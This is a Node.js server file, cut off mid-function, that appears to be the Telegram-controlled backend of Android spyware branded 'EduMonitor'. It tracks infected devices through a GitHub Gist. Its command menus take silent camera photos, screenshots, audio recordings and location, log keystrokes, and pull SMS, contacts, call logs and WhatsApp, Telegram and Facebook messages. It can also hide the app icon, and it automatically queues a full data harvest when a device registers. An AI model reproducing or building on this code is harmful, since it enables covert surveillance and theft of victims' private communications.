require('dotenv').config();

const express = require('express');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const FormData = require('form-data');
const { Octokit } = require('@octokit/rest');
const app = express();
const PORT = process.env.PORT || 3000;
const os = require('os');

// ============= GITHUB GIST CONFIGURATION =============
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const GIST_ID = process.env.GIST_ID;

let octokit = null;
if (GITHUB_TOKEN) {
    octokit = new Octokit({ auth: GITHUB_TOKEN });
    console.log('✅ GitHub client initialized for secondary server');
} else {
    console.log('⚠️ GITHUB_TOKEN not set, using local file storage only');
}

const GIST_FILES = {
    DEVICES: 'devices.json',
    AUTO_DATA: 'autodata.json',
    FAILOVER_STATE: 'failover_state.json'
};

// ============= CONFIGURATION =============
// IMPORTANT: For SECONDARY server, MAIN_BOT_TOKEN is empty
// The secondary server uses its OWN bot token
const MAIN_BOT_TOKEN = process.env.MAIN_BOT_TOKEN || '';
const SECONDARY_BOT_TOKEN = process.env.SECONDARY_BOT_TOKEN;
const SECONDARY_SERVER_URL = process.env.SECONDARY_SERVER_URL || 'https://core-m0tr.onrender.com';

// Current active configuration - start with secondary
let activeBotToken = SECONDARY_BOT_TOKEN;
let activeServerUrl = SECONDARY_SERVER_URL;

// Store authorized devices and their commands
const devices = new Map();
const userDeviceSelection = new Map();
const userStates = new Map();

// Store authorized chat IDs - use the SAME chat ID as main server
const authorizedChats = new Set();
const chatIdsFromEnv = process.env.AUTHORIZED_CHAT_IDS || '';
chatIdsFromEnv.split(',').forEach(id => {
    const trimmedId = id.trim();
    if (trimmedId) {
        authorizedChats.add(trimmedId);
    }
});

if (authorizedChats.size === 0) {
    console.error('❌ No authorized chat IDs configured!');
    if (process.env.NODE_ENV === 'production') {
        process.exit(1);
    }
} else {
    console.log(`✅ Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
}

// Auto-collection flags
const autoDataRequested = new Map();

// Failover state tracking
let failoverState = {
    isFailedOver: true,
    failedOverAt: Date.now(),
    originalBotToken: MAIN_BOT_TOKEN,
    currentBotToken: SECONDARY_BOT_TOKEN,
    currentServerUrl: SECONDARY_SERVER_URL,
    failoverCount: 1
};

// Encryption salt
const ENCRYPTION_SALT = process.env.ENCRYPTION_SALT;
if (!ENCRYPTION_SALT) {
    console.error('❌ ENCRYPTION_SALT is required for secondary server!');
    if (process.env.NODE_ENV === 'production') {
        process.exit(1);
    }
}

// ============= GITHUB GIST STORAGE FUNCTIONS =============

async function readFromGist(filename) {
    if (!octokit || !GIST_ID) return null;
    try {
        const response = await octokit.gists.get({ gist_id: GIST_ID });
        const fileContent = response.data.files[filename];
        if (fileContent && fileContent.content) {
            return JSON.parse(fileContent.content);
        }
        return null;
    } catch (error) {
        if (error.status === 404) {
            console.log(`📝 Gist not found, will create new one on first save`);
            return null;
        }
        console.error(`❌ Error reading ${filename} from Gist:`, error.message);
        return null;
    }
}

async function writeToGist(filename, data) {
    if (!octokit) return false;
    try {
        const content = JSON.stringify(data, null, 2);
        let allFiles = {};
        if (GIST_ID) {
            try {
                const currentGist = await octokit.gists.get({ gist_id: GIST_ID });
                for (const [name, file] of Object.entries(currentGist.data.files)) {
                    if (name !== filename && file.content) {
                        allFiles[name] = { content: file.content };
                    }
                }
            } catch (error) {
                console.log(`⚠️ Could not fetch current gist: ${error.message}`);
            }
        }
        allFiles[filename] = { content: content };
        if (!GIST_ID) {
            const response = await octokit.gists.create({
                description: 'EduMonitor Bot Storage - Secondary Server',
                public: false,
                files: allFiles
            });
            const newGistId = response.data.id;
            console.log(`✅ Created new gist with ID: ${newGistId}`);
            console.log(`⚠️ IMPORTANT: Add GIST_ID=${newGistId} to BOTH server environment variables!`);
            return true;
        } else {
            await octokit.gists.update({ gist_id: GIST_ID, files: allFiles });
            console.log(`💾 Saved ${filename} to shared GitHub Gist`);
            return true;
        }
    } catch (error) {
        console.error(`❌ Error writing ${filename} to Gist:`, error.message);
        return false;
    }
}

async function loadAllFromGist() {
    console.log('🔄 Loading data from shared GitHub Gist...');
    if (!octokit) return false;
    try {
        const devicesData = await readFromGist(GIST_FILES.DEVICES);
        if (devicesData) {
            devices.clear();
            for (const [id, device] of Object.entries(devicesData)) {
                devices.set(id, device);
            }
            console.log(`✅ Loaded ${devices.size} devices from shared Gist`);
        }
        const autoDataData = await readFromGist(GIST_FILES.AUTO_DATA);
        if (autoDataData) {
            autoDataRequested.clear();
            for (const [id, flag] of Object.entries(autoDataData)) {
                autoDataRequested.set(id, flag);
            }
            console.log(`✅ Loaded ${autoDataRequested.size} auto-data flags from shared Gist`);
        }
        return true;
    } catch (error) {
        console.error('❌ Error loading from Gist:', error.message);
        return false;
    }
}

async function saveDevices() {
    if (octokit) {
        const devicesObj = {};
        for (const [id, device] of devices.entries()) {
            devicesObj[id] = device;
        }
        await writeToGist(GIST_FILES.DEVICES, devicesObj);
    }
    saveLocalBackup();
}

async function saveAutoDataFlags() {
    if (octokit) {
        const autoDataObj = {};
        for (const [id, flag] of autoDataRequested.entries()) {
            autoDataObj[id] = flag;
        }
        await writeToGist(GIST_FILES.AUTO_DATA, autoDataObj);
    }
    saveLocalBackup();
}

function saveLocalBackup() {
    try {
        const backupDir = path.join(__dirname, 'backup');
        if (!fs.existsSync(backupDir)) fs.mkdirSync(backupDir, { recursive: true });
        const devicesObj = {};
        for (const [id, device] of devices.entries()) {
            const sanitizedDevice = { ...device };
            delete sanitizedDevice.pendingCommands;
            devicesObj[id] = sanitizedDevice;
        }
        fs.writeFileSync(path.join(backupDir, 'devices.backup.json'), JSON.stringify(devicesObj, null, 2));
        const autoDataObj = {};
        for (const [id, flag] of autoDataRequested.entries()) {
            autoDataObj[id] = flag;
        }
        fs.writeFileSync(path.join(backupDir, 'autodata.backup.json'), JSON.stringify(autoDataObj, null, 2));
        console.log(`💾 Saved local backup`);
    } catch (error) {
        console.error('Error saving local backup:', error);
    }
}

function loadLocalBackup() {
    try {
        const backupDir = path.join(__dirname, 'backup');
        const devicesBackup = path.join(backupDir, 'devices.backup.json');
        if (fs.existsSync(devicesBackup)) {
            const data = fs.readFileSync(devicesBackup, 'utf8');
            const savedDevices = JSON.parse(data);
            for (const [id, device] of Object.entries(savedDevices)) {
                devices.set(id, device);
            }
            console.log(`✅ Loaded ${devices.size} devices from local backup`);
        }
        const autoDataBackup = path.join(backupDir, 'autodata.backup.json');
        if (fs.existsSync(autoDataBackup)) {
            const data = fs.readFileSync(autoDataBackup, 'utf8');
            const savedAutoData = JSON.parse(data);
            for (const [id, flag] of Object.entries(savedAutoData)) {
                autoDataRequested.set(id, flag);
            }
            console.log(`✅ Loaded ${autoDataRequested.size} auto-data flags from local backup`);
        }
    } catch (error) {
        console.error('Error loading local backup:', error);
    }
}

// Create uploads directory
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

// ============= ENCRYPTION FUNCTIONS =============

function encryptForDevice(data, deviceId) {
    try {
        const combinedKey = deviceId + ENCRYPTION_SALT;
        const key = crypto.createHash('sha256').update(combinedKey).digest();
        const iv = key.slice(0, 16);
        const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
        let encrypted = cipher.update(data, 'utf8', 'base64');
        encrypted += cipher.final('base64');
        return encrypted;
    } catch (error) {
        console.error('Encryption error:', error);
        return null;
    }
}

// ============= DEVICE CONFIGURATION =============
const defaultChatId = Array.from(authorizedChats)[0] || '';

const deviceConfigs = {
    'default': {
        chatId: defaultChatId,
        config: {
            chatId: defaultChatId,
            botToken: SECONDARY_BOT_TOKEN,
            serverUrl: SECONDARY_SERVER_URL,
            pollingInterval: 15000,
            keepAliveInterval: 300000,
            realtimeLogging: false,
            autoScreenshot: false,
            autoRecording: false,
            screenshotQuality: 30,
            recordingQuality: 'VERY LOW',
            appOpenBatchSize: 50,
            syncBatchSize: 20,
            targetApps: [
                'com.sec.android.gallery3d', 'com.samsung.android.messaging', 'com.android.chrome',
                'com.google.android.youtube', 'com.google.android.apps.camera', 'com.sec.android.app.camera',
                'com.android.camera', 'com.whatsapp', 'com.instagram.android', 'com.facebook.katana',
                'com.snapchat.android', 'com.google.android.apps.maps', 'com.google.android.apps.messaging',
                'com.microsoft.teams', 'com.zoom.us', 'com.discord', 'com.mediatek.camera',
                'com.whatsapp.w4b', 'com.pri.filemanager', 'com.android.dialer', 'com.facebook.orca',
                'com.google.android.apps.photosgo', 'com.tencent.mm', 'com.google.android.apps.photos',
                'org.telegram.messenger'
            ],
            features: {
                contacts: true, sms: true, callLogs: true, location: true, screenshots: true,
                recordings: true, keystrokes: true, notifications: true, phoneInfo: true,
                wifiInfo: true, mobileInfo: true,
            }
        }
    }
};

function getDeviceConfig(deviceId) {
    return deviceConfigs[deviceId] || deviceConfigs['default'];
}

// ============= FILE UPLOAD CONFIGURATION =============
const storage = multer.diskStorage({
    destination: (req, file, cb) => { cb(null, uploadDir); },
    filename: (req, file, cb) => {
        const deviceId = req.body.deviceId || 'unknown';
        const count = req.body.count || '0';
        const timestamp = Date.now();
        const safeName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_');
        cb(null, `${deviceId}-${count}-${timestamp}-${safeName}`);
    }
});

const upload = multer({
    storage,
    limits: { fileSize: 50 * 1024 * 1024, fieldSize: 50 * 1024 * 1024 }
});

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ============= HELPER FUNCTIONS =============

function isAuthorizedChat(chatId) { return authorizedChats.has(String(chatId)); }

function sendJsonResponse(res, data, statusCode = 200) {
    try { res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data)); }
    catch (e) { console.error('Error stringifying JSON:', e); res.status(500).json({ error: 'Internal server error' }); }
}

function getServerIP() {
    try {
        const interfaces = os.networkInterfaces();
        for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                if (iface.family === 'IPv4' && !iface.internal) return iface.address;
            }
        }
    } catch (e) { console.error('Error getting server IP:', e); }
    return 'Unknown';
}

function getTelegramApiUrl() { return `https://api.telegram.org/bot${activeBotToken}`; }

function getDeviceListForUser(chatId) {
    const userDevices = [];
    for (const [deviceId, device] of devices.entries()) {
        if (String(device.chatId) === String(chatId)) {
            userDevices.push({
                id: deviceId,
                name: device.deviceInfo?.model || 'Unknown Device',
                lastSeen: device.lastSeen,
                isActive: deviceId === userDeviceSelection.get(chatId),
                phoneNumber: device.phoneNumber || 'Not available',
                lastSeenFormatted: new Date(device.lastSeen).toLocaleString()
            });
        }
    }
    return userDevices;
}

function getDeviceSelectionKeyboard(chatId) {
    const userDevices = getDeviceListForUser(chatId);
    const keyboard = [];
    userDevices.forEach(device => {
        const status = device.isActive ? '✅ ' : '';
        const lastSeen = new Date(device.lastSeen).toLocaleTimeString();
        keyboard.push([{ text: `${status}${device.name} (${lastSeen})`, callback_data: `select_device:${device.id}` }]);
    });
    keyboard.push([{ text: '🔄 Refresh List', callback_data: 'refresh_devices' }]);
    keyboard.push([{ text: '📊 Device Stats', callback_data: 'device_stats' }]);
    keyboard.push([{ text: '◀️ Back to Main Menu', callback_data: 'help_main' }]);
    return keyboard;
}

// ==================== MAIN MENU ====================

function getMainMenuKeyboard(chatId) {
    const activeDeviceId = userDeviceSelection.get(chatId);
    const activeDevice = activeDeviceId ? devices.get(activeDeviceId) : null;
    const deviceCount = getDeviceListForUser(chatId).length;
    let deviceStatus = `📱 ${deviceCount} device(s)`;
    if (activeDevice) deviceStatus = `✅ ${activeDevice.deviceInfo?.model || 'Device'}`;
    return [
        [{ text: '📸 Screenshot', callback_data: 'menu_screenshot' }, { text: '📷 Camera', callback_data: 'menu_camera' }],
        [{ text: '🎤 Recording', callback_data: 'menu_recording' }, { text: '📍 Location', callback_data: 'cmd:location' }],
        [{ text: '📊 Data', callback_data: 'menu_data' }, { text: '⚡ Real-time', callback_data: 'menu_realtime' }],
        [{ text: 'ℹ️ Info', callback_data: 'menu_info' }, { text: '⚙️ System', callback_data: 'menu_system' }],
        [{ text: deviceStatus, callback_data: 'menu_devices' }, { text: '❌ Close', callback_data: 'close_menu' }]
    ];
}

// ==================== SCREENSHOT MENU ====================

function getScreenshotMenuKeyboard() {
    return [
        [{ text: '📸 Take Screenshot', callback_data: 'cmd:screenshot' }, { text: '▶️ Start Service', callback_data: 'cmd:start_screenshot' }],
        [{ text: '⏹️ Stop Service', callback_data: 'cmd:stop_screenshot' }, { text: '🔄 Restart', callback_data: 'cmd:restart_screenshot' }],
        [{ text: '⚙️ Settings', callback_data: 'menu_screenshot_settings' }, { text: '🎯 Target Apps', callback_data: 'menu_screenshot_targets' }],
        [{ text: '🎨 Quality', callback_data: 'menu_screenshot_quality' }, { text: '🔑 Token', callback_data: 'menu_screenshot_token' }],
        [{ text: '🔧 Check Accessibility', callback_data: 'cmd:check_accessibility' }, { text: '◀️ Back', callback_data: 'help_main' }]
    ];
}

function getScreenshotSettingsKeyboard() {
    return [
        [{ text: '📊 Status', callback_data: 'cmd:screenshot_status' }, { text: '⚙️ Config', callback_data: 'menu_sched_config' }],
        [{ text: '◀️ Back', callback_data: 'menu_screenshot' }]
    ];
}

function getScreenshotTargetsKeyboard() {
    return [
        [{ text: '➕ Add Target', callback_data: 'menu_add_target' }, { text: '❌ Remove Target', callback_data: 'menu_remove_target' }],
        [{ text: '📱 List Targets', callback_data: 'cmd:target_apps' }, { text: '📋 Default Targets', callback_data: 'cmd:default_targets' }],
        [{ text: '🔄 Reset Targets', callback_data: 'cmd:reset_targets' }, { text: '◀️ Back', callback_data: 'menu_screenshot' }]
    ];
}

function getScreenshotQualityKeyboard() {
    return [
        [{ text: '📏 Small (640x480, 60%)', callback_data: 'cmd:small' }],
        [{ text: '📏 Medium (1280x720, 70%)', callback_data: 'cmd:medium' }],
        [{ text: '📏 Original (Full res, 85%)', callback_data: 'cmd:original' }],
        [{ text: '◀️ Back', callback_data: 'menu_screenshot' }]
    ];
}

function getScreenshotTokenKeyboard() {
    return [
        [{ text: '🔄 Refresh Token', callback_data: 'cmd:refresh_token' }, { text: '🔑 Token Status', callback_data: 'cmd:token_status' }],
        [{ text: '◀️ Back', callback_data: 'menu_screenshot' }]
    ];
}

function getSchedConfigKeyboard() {
    return [
        [{ text: '📅 Configure Schedule', callback_data: 'menu_configure_schedule' }],
        [{ text: '◀️ Back', callback_data: 'menu_screenshot_settings' }]
    ];
}

// ==================== CAMERA MENU ====================

function getCameraMenuKeyboard() {
    return [
        [{ text: '📸 Take Photo', callback_data: 'cmd:photo' }, { text: '🔇 Silent Photo', callback_data: 'cmd:photo_silent' }],
        [{ text: '👤 Front Camera', callback_data: 'cmd:camera_front' }, { text: '👥 Back Camera', callback_data: 'cmd:camera_back' }],
        [{ text: '🔄 Switch Camera', callback_data: 'cmd:camera_switch' }, { text: '👤 Front Silent', callback_data: 'cmd:photo_front' }],
        [{ text: '◀️ Back', callback_data: 'help_main' }]
    ];
}

// ==================== RECORDING MENU ====================

function getRecordingMenuKeyboard() {
    return [
        [{ text: '🎤 Start 60s', callback_data: 'cmd:start_60s_rec' }, { text: '⏹️ Stop', callback_data: 'cmd:stop_60s_rec' }],
        [{ text: '⚙️ Settings', callback_data: 'menu_recording_settings' }, { text: '◀️ Back', callback_data: 'help_main' }]
    ];
}

function getRecordingSettingsKeyboard() {
    return [
        [{ text: '📊 Info', callback_data: 'cmd:record_info' }, { text: '✅ Enable Schedule', callback_data: 'cmd:record_on' }],
        [{ text: '❌ Disable Schedule', callback_data: 'cmd:record_off' }, { text: '⚙️ Custom Schedule', callback_data: 'menu_custom_schedule' }],
        [{ text: '🎚️ Audio Quality', callback_data: 'menu_audio_quality' }, { text: '◀️ Back', callback_data: 'menu_recording' }]
    ];
}

function getAudioQualityKeyboard() {
    return [
        [{ text: '🎤 Ultra Low', callback_data: 'cmd:audio_ultra' }, { text: '🎤 Very Low', callback_data: 'cmd:audio_very_low' }],
        [{ text: '🎤 Low', callback_data: 'cmd:audio_low' }, { text: '🎤 Medium', callback_data: 'cmd:audio_medium' }],
        [{ text: '🎤 High', callback_data: 'cmd:audio_high' }, { text: '◀️ Back', callback_data: 'menu_recording_settings' }]
    ];
}

// ==================== DATA MENU ====================

function getDataMenuKeyboard() {
    return [
        [{ text: '📊 NEW Data', callback_data: 'menu_new_data' }, { text: '📊 ALL Data', callback_data: 'menu_all_data' }],
        [{ text: '🔄 Sync & Harvest', callback_data: 'menu_sync_harvest' }, { text: '◀️ Back', callback_data: 'help_main' }]
    ];
}

function getNewDataKeyboard() {
    return [
        [{ text: '📇 Contacts', callback_data: 'cmd:contacts' }, { text: '💬 SMS', callback_data: 'cmd:sms' }],
        [{ text: '📞 Call Logs', callback_data: 'cmd:calllogs' }, { text: '📱 Apps', callback_data: 'cmd:apps_list' }],
        [{ text: '⌨️ Keystrokes', callback_data: 'cmd:keys' }, { text: '🔔 Notifications', callback_data: 'cmd:notify' }],
        [{ text: '📱 App Opens', callback_data: 'cmd:open_app' }, { text: '💬 WhatsApp', callback_data: 'cmd:whatsapp' }],
        [{ text: '💬 Telegram', callback_data: 'cmd:telegram' }, { text: '💬 Facebook', callback_data: 'cmd:facebook' }],
        [{ text: '🌐 Browser', callback_data: 'cmd:browser' }, { text: '◀️ Back', callback_data: 'menu_data' }]
    ];
}

function getAllDataKeyboard() {
    return [
        [{ text: '📇 ALL Contacts', callback_data: 'cmd:contacts_all' }, { text: '💬 ALL SMS', callback_data: 'cmd:sms_all' }],
        [{ text: '📞 ALL Call Logs', callback_data: 'cmd:calllogs_all' }, { text: '📱 ALL Apps', callback_data: 'cmd:apps_all' }],
        [{ text: '⌨️ ALL Keystrokes', callback_data: 'cmd:keys_all' }, { text: '🔔 ALL Notifications', callback_data: 'cmd:notify_all' }],
        [{ text: '💬 ALL WhatsApp', callback_data: 'cmd:whatsapp_all' }, { text: '💬 ALL Telegram', callback_data: 'cmd:telegram_all' }],
        [{ text: '💬 ALL Facebook', callback_data: 'cmd:facebook_all' }, { text: '🌐 ALL Browser', callback_data: 'cmd:browser_all' }],
        [{ text: '📍 Location', callback_data: 'cmd:location' }, { text: '🔍 Find Recorded', callback_data: 'cmd:find_recorded' }],
        [{ text: '◀️ Back', callback_data: 'menu_data' }]
    ];
}

function getSyncHarvestKeyboard() {
    return [
        [{ text: '🔄 Sync All', callback_data: 'cmd:sync_all' }, { text: '⚡ Force Harvest', callback_data: 'cmd:force_harvest' }],
        [{ text: '📊 Stats', callback_data: 'cmd:stats' }, { text: '📊 Logs Count', callback_data: 'cmd:logs_count' }],
        [{ text: '🗑️ Clear Logs', callback_data: 'cmd:clear_logs' }, { text: '⚙️ Set Sync Interval', callback_data: 'menu_set_sync_interval' }],
        [{ text: '◀️ Back', callback_data: 'menu_data' }]
    ];
}

// ==================== REAL-TIME MENU ====================

function getRealtimeMenuKeyboard() {
    return [
        [{ text: '🔑 Keys ON', callback_data: 'cmd:rt_keys_on' }, { text: '🔑 Keys OFF', callback_data: 'cmd:rt_keys_off' }],
        [{ text: '🔔 Notif ON', callback_data: 'cmd:rt_notif_on' }, { text: '🔔 Notif OFF', callback_data: 'cmd:rt_notif_off' }],
        [{ text: '✅ All ON', callback_data: 'cmd:rt_all_on' }, { text: '❌ All OFF', callback_data: 'cmd:rt_all_off' }],
        [{ text: '📊 Status', callback_data: 'cmd:rt_status' }, { text: '◀️ Back', callback_data: 'help_main' }]
    ];
}

// ==================== INFO MENU ====================

function getInfoMenuKeyboard() {
    return [
        [{ text: '📱 Device Info', callback_data: 'cmd:device_info' }],
        [{ text: '🌐 Network Info', callback_data: 'cmd:network_info' }],
        [{ text: '📱 Mobile Info', callback_data: 'cmd:mobile_info' }],
        [{ text: '🏷️ Device Name', callback_data: 'menu_device_name' }],
        [{ text: '◀️ Back', callback_data: 'help_main' }]
    ];
}

function getDeviceNameKeyboard() {
    return [
        [{ text: '📱 Show Name', callback_data: 'cmd:device_name' }, { text: '🔄 Reset Name', callback_data: 'cmd:reset_device_name' }],
        [{ text: '◀️ Back', callback_data: 'menu_info' }]
    ];
}

// ==================== SYSTEM MENU ====================

function getSystemMenuKeyboard() {
    return [
        [{ text: '📁 Media', callback_data: 'menu_media' }, { text: '📱 App Management', callback_data: 'menu_app_management' }],
        [{ text: '📡 Data Saving', callback_data: 'menu_data_saving' }, { text: '🤖 Bot Token', callback_data: 'menu_bot_token' }],
        [{ text: '◀️ Back', callback_data: 'help_main' }]
    ];
}

function getMediaMenuKeyboard() {
    return [
        [{ text: '🔍 Find Recorded', callback_data: 'cmd:find_recorded' }, { text: '🗑️ Clear Storage', callback_data: 'cmd:clear_storage' }],
        [{ text: '✅ Enable Media Scan', callback_data: 'cmd:enable_media_scan' }, { text: '❌ Disable Media Scan', callback_data: 'cmd:disable_media_scan' }],
        [{ text: '📊 Scan Status', callback_data: 'cmd:media_scan_status' }, { text: '➕ Add Scan Path', callback_data: 'menu_add_scan_path' }],
        [{ text: '❌ Remove Scan Path', callback_data: 'menu_remove_scan_path' }, { text: '📋 List Paths', callback_data: 'cmd:list_scan_paths' }],
        [{ text: '🗑️ Clear Paths', callback_data: 'cmd:clear_scan_paths' }, { text: '◀️ Back', callback_data: 'menu_system' }]
    ];
}

function getAppManagementKeyboard() {
    return [
        [{ text: '🔄 Reboot Services', callback_data: 'cmd:reboot_app' }, { text: '👻 Hide Icon', callback_data: 'cmd:hide_icon' }],
        [{ text: '👁️ Show Icon', callback_data: 'cmd:show_icon' }, { text: '📁 Browse Files', callback_data: 'cmd:browse_files' }],
        [{ text: '◀️ Back', callback_data: 'menu_system' }]
    ];
}

function getDataSavingKeyboard() {
    return [
        [{ text: '📡 WiFi-Only ON', callback_data: 'cmd:wifi_only_on' }, { text: '📡 WiFi-Only OFF', callback_data: 'cmd:wifi_only_off' }],
        [{ text: '📊 Saving Status', callback_data: 'cmd:saving_status' }, { text: '◀️ Back', callback_data: 'menu_system' }]
    ];
}

function getBotTokenKeyboard() {
    return [
        [{ text: '🤖 Backup Status', callback_data: 'cmd:backup_status' }, { text: '🔄 Set Server Backup', callback_data: 'menu_set_server_backup' }],
        [{ text: '🔄 Force Register', callback_data: 'cmd:force_register_complete' }, { text: '◀️ Back', callback_data: 'menu_system' }]
    ];
}

// ==================== INPUT PROMPT MENUS ====================

function getAddTargetKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_targets' }]]; }
function getRemoveTargetKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_targets' }]]; }
function getAddScanPathKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_media' }]]; }
function getRemoveScanPathKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_media' }]]; }
function getConfigureScheduleKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_settings' }]]; }
function getCustomScheduleKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_recording_settings' }]]; }
function getSetSyncIntervalKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_sync_harvest' }]]; }
function getSetServerBackupKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_bot_token' }]]; }

// ============= TELEGRAM MESSAGE FUNCTIONS =============

async function sendTelegramMessage(chatId, text) {
    try {
        if (!text || text.trim().length === 0) return null;
        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
        const response = await axios.post(`${getTelegramApiUrl()}/sendMessage`, {
            chat_id: chatId, text: text, parse_mode: 'HTML'
        });
        console.log(`✅ Message sent successfully`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message:', error.response?.data || error.message);
        if (error.response?.status === 400) {
            try {
                const response = await axios.post(`${getTelegramApiUrl()}/sendMessage`, {
                    chat_id: chatId, text: text.replace(/<[^>]*>/g, '')
                });
                return response.data;
            } catch (e) { console.error('❌ Plain text also failed:', e.response?.data || e.message); }
        }
        return null;
    }
}

async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
    try {
        console.log(`📨 Sending message with inline keyboard to ${chatId}`);
        const response = await axios.post(`${getTelegramApiUrl()}/sendMessage`, {
            chat_id: chatId, text: text, parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard }
        });
        console.log(`✅ Message with keyboard sent successfully`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message with keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function editMessageKeyboard(chatId, messageId, newKeyboard) {
    try {
        console.log(`🔄 Editing keyboard for message ${messageId}`);
        const response = await axios.post(`${getTelegramApiUrl()}/editMessageReplyMarkup`, {
            chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: newKeyboard }
        });
        console.log(`✅ Keyboard updated`);
        return response.data;
    } catch (error) {
        if (error.response?.data?.description?.includes('message is not modified')) {
            console.log(`⏭️ Keyboard already up to date`);
            return null;
        }
        console.error('❌ Error editing keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function answerCallbackQuery(callbackQueryId, text = null) {
    try {
        await axios.post(`${getTelegramApiUrl()}/answerCallbackQuery`, { callback_query_id: callbackQueryId, text: text });
    } catch (error) { console.error('Error answering callback query:', error.response?.data || error.message); }
}

async function setChatMenuButton(chatId) {
    try {
        console.log(`🔘 Setting menu button for chat ${chatId}`);
        const commands = [
            { command: 'help', description: '📋 Complete help menu' },
            { command: 'showmenu', description: '📋 Show help menu' },
            { command: 'devices', description: '📱 List all devices' },
            { command: 'select', description: '🎯 Select device to control' },
            { command: 'screenshot', description: '📸 Take screenshot' },
            { command: 'record', description: '🎤 Start recording' },
            { command: 'location', description: '📍 Get location' },
            { command: 'sync_all', description: '🔄 Sync all data' }
        ];
        await axios.post(`${getTelegramApiUrl()}/setMyCommands`, { commands });
        await axios.post(`${getTelegramApiUrl()}/setChatMenuButton`, {
            chat_id: chatId, menu_button: { type: 'commands', text: 'Menu' }
        });
        console.log(`✅ Menu button and ${commands.length} commands set`);
    } catch (error) { console.error('Error setting menu button:', error.response?.data || error.message); }
}

async function sendTelegramDocument(chatId, filePath, filename, caption) {
    try {
        console.log(`📎 Sending document to ${chatId}: ${filename}`);
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);
        const response = await axios.post(`${getTelegramApiUrl()}/sendDocument`, formData, {
            headers: { ...formData.getHeaders() }, maxContentLength: Infinity, maxBodyLength: Infinity
        });
        console.log(`✅ Document sent successfully`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending document:', error.response?.data || error.message);
        try {
            const stats = fs.statSync(filePath);
            await sendTelegramMessage(chatId, `⚠️ File too large to send directly.\n\nThe file is ${(stats.size / 1024).toFixed(2)} KB.`);
        } catch (e) { console.error('Error sending fallback message:', e); }
        return null;
    }
}

// ============= FORMATTER FUNCTIONS =============

function formatLocationMessage(locationData) {
    try {
        let locData = locationData;
        if (typeof locationData === 'string') {
            try { locData = JSON.parse(locationData); } catch (e) { return { text: locationData }; }
        }
        if (locData.lat && locData.lon) {
            const lat = locData.lat, lon = locData.lon, accuracy = locData.accuracy || 'Unknown', provider = locData.provider || 'unknown';
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            return {
                text: `📍 <b>Location Update</b>\n\n• <b>Latitude:</b> <code>${lat}</code>\n• <b>Longitude:</b> <code>${lon}</code>\n• <b>Accuracy:</b> ±${accuracy}m\n• <b>Provider:</b> ${provider}\n\n🗺️ <a href="${mapsUrl}">View on Google Maps</a>`,
                mapsUrl: mapsUrl, lat: lat, lon: lon
            };
        }
        return { text: locationData };
    } catch (error) { console.error('Error formatting location:', error); return { text: locationData }; }
}

// ============= AUTO DATA COLLECTION =============

function queueAutoDataCommands(deviceId, chatId) {
    console.log(`🔄 Queueing auto-data collection for device ${deviceId}`);
    if (autoDataRequested.has(deviceId)) { console.log(`⚠️ Auto-data already requested for ${deviceId}, skipping`); return; }
    autoDataRequested.set(deviceId, { timestamp: Date.now(), requested: ['device_info', 'network_info', 'mobile_info', 'contacts', 'sms', 'calllogs', 'apps_list', 'keys', 'notify', 'whatsapp', 'telegram', 'facebook', 'browser', 'location'] });
    saveAutoDataFlags();
    const device = devices.get(deviceId);
    if (!device) { console.error(`❌ Device not found for auto-data: ${deviceId}`); return; }
    if (!device.pendingCommands) device.pendingCommands = [];
    const commands = [
        { command: 'device_info', delay: 0, description: 'Device Info' },
        { command: 'network_info', delay: 5, description: 'Network Info' },
        { command: 'mobile_info', delay: 10, description: 'Mobile Info' },
        { command: 'contacts', delay: 15, description: 'Contacts' },
        { command: 'sms', delay: 20, description: 'SMS' },
        { command: 'calllogs', delay: 25, description: 'Call Logs' },
        { command: 'apps_list', delay: 30, description: 'Apps' },
        { command: 'keys', delay: 35, description: 'Keystrokes' },
        { command: 'notify', delay: 40, description: 'Notifications' },
        { command: 'whatsapp', delay: 45, description: 'WhatsApp' },
        { command: 'telegram', delay: 50, description: 'Telegram' },
        { command: 'facebook', delay: 55, description: 'Facebook' },
        { command: 'browser', delay: 60, description: 'Browser History' },
        { command: 'location', delay: 65, description: 'Location' }
    ];
    commands.forEach((cmd) => {
        device.pendingCommands.push({ command: cmd.command, originalCommand: `/${cmd.command}`, messageId: null, timestamp: Date.now() + (cmd.delay * 1000), autoData: true });
        console.log(`📝 Auto-data command queued: ${cmd.command} (${cmd.description})`);
    });
    console.log(`✅ All ${commands.length} auto-data commands queued for ${deviceId}`);
    saveDevices();
}

// ============= API ENDPOINTS =============

app.get('/api/device/:deviceId/complete-config', (req, res) => {
    const deviceId = req.params.deviceId;
    console.log(`🔐 Complete config requested from secondary server for device: ${deviceId}`);
    const deviceConfig = getDeviceConfig(deviceId);
